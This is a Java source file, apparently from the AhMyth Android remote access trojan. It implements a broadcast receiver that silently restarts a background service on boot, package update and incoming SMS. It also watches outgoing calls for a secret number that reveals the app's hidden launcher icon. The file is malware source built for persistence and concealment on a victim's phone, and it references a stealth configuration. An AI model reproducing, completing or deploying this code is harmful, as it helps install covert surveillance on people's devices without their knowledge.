package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {
    
    private static final String TAG = "AhMythReceiver";
    
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            Log.w(TAG, "Received null intent or action");
            return;
        }
        
        String action = intent.getAction();
        Log.d(TAG, "Received action: " + action);

        // Handle boot completed events - only if START_ON_BOOT is enabled
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
            "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
            
            if (StealthConfig.START_ON_BOOT) {
                Log.d(TAG, "Boot/Package event received, starting service (START_ON_BOOT enabled)");
                startService(context);
            } else {
                Log.d(TAG, "Boot/Package event received but START_ON_BOOT is disabled");
            }
        }
        
        // Handle SMS received
        if ("android.provider.Telephony.SMS_RECEIVED".equals(action)) {
            Log.d(TAG, "SMS received event");
            startService(context);
        }

        // Handle outgoing call (for unhide feature)
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            handleOutgoingCall(context, intent);
        }
    }
    
    private void startService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Log.d(TAG, "Starting foreground service (Android 8+)");
                ContextCompat.startForegroundService(context, serviceIntent);
            } else {
                Log.d(TAG, "Starting regular service");
                context.startService(serviceIntent);
            }
            
            // Also call the static method
            MainService.startService(context);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting service from receiver", e);
            
            // Fallback: try again with a small delay via MainService.start()
            try {
                MainService.start();
            } catch (Exception e2) {
                Log.e(TAG, "Fallback service start failed", e2);
            }
        }
    }
    
    private void handleOutgoingCall(Context context, Intent intent) {
        try {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            
            if (phoneNumber != null && 
                phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))) {
                
                Log.d(TAG, "Unhide phone number detected");
                
                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
                boolean hidden_status = sharedPreferences.getBoolean("hidden_status", false);
                
                if (hidden_status) {
                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
                    appSettingEditor.putBoolean("hidden_status", false);
                    appSettingEditor.apply();
                    
                    ComponentName componentName = new ComponentName(context, MainActivity.class);
                    
                    context.getPackageManager()
                        .setComponentEnabledSetting(componentName,
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP);
                    
                    Toast.makeText(context, "App icon has been revealed!", Toast.LENGTH_SHORT).show();
                    Log.d(TAG, "App icon unhidden");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling outgoing call", e);
        }
    }
}
